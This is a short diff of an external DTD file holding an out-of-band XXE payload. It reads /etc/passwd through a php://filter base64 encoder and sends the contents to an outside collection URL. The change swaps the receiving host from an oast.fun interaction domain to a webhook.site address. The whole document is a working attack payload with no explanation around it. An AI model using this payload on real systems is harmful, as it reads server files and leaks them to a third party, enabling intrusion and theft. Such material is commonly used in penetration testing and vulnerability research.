@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://ifihqjmpehrhwrneyxbtsqikp66yxwj7e.oast.fun/?content=%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://webhook.site/e71889f9-73c8-4ef2-aabf-be89936c043d/?content=%data;'>">
